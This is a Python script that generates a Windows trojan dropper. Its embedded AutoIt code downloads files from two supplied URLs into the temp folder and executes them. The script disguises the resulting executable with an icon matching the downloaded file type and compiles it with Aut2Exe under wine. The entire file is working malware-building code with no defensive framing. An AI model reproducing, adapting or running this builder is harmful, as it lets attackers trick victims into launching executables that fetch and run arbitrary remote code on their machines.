#!/usr/bin/env python
import subprocess


TROJAN_SOURCE_CODE_FILE = "trojan.txt"
AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"

trojan_code = """
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urlsArray = StringSplit($urls, ",", 2 )
For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)
Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
"""

class Trojan:

	def __init__(self, url1, url2, icon):
		self.url1 = url1
		self.url2 = url2
		file_type = url1.split(".")[-1]
		self.icon = "icons/" + file_type + ".ico"
		if icon != None:
			self.icon = icon
			
		print(self.icon)
		
	def create(self):
		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
			trojan_file.write(urls + trojan_code)

	def compilea(self, out_file):
		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
